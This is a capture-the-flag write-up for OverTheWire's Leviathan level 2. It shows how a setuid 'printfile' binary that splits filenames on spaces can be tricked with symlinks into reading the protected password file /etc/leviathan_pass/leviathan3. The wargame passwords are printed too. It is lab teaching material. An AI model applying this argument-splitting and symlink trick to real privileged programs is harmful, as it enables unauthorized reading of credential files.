# Leviathan Level 2 → Level 3
(Updated: 12 August 2025)

## Credentials
- **Username:** `leviathan2`
- **Password:** `NsN1HwFoyN`

## Connection
```bash
ssh leviathan2@bandit.labs.overthewire.org -p 2223
```

## Hints & Commands Learned
- ln -s

## Steps to Solve
1. Step 1 – Use `ssh` to get access to OverTheWire labs.
2. Step 2 – Use `ls -la` to list files and you can see that we have a `printfile` binary files (which owned by `leviathan3`).
3. Step 3 - Call `./printfile /etc/leviathan_pass/leviathan3` and you can see we can't get the password.
5. Step 5 - Use previous knowledge `ltrace ./printfile bash_logout` we can see that `printfile` use `bin/cat` to print the content of `bash_logout`.
6. Step 6 - Try with file with name has space `mktemp -d` and `touch /tmp/tmp.xxxxxx/test file.txt`, then `./printfile /tmp/tmp.xxxxxx/test file.txt` we get the result:
```
/bin/cat: /tmp/tmp.xxxxxx/test: No such file or directory
/bin/cat: /tmp/tmp.xxxxxx/file.txt: No such file or directory
```
7. Step 7 - Let's add `test` and `file.txt` files, but we have to log the password from `/etc/leviathan_pass/leviathan3`.
8. Step 8 - Use `ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.xxxxxxx/test` and `ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.xxxxxxx/file.txt` to link two files to the password.

9. Step 9 - Run `./printfile /tmp/tmp.xxxxxx/test file.txt` and you can see the password in the first line.
***Note: `chmod 777 /tmp/tmp.xxxxxx` if you have permission denied.***

10. Step 10 - Take the password to the next level.

## Next Level Password
`f0n8h2iWLP`
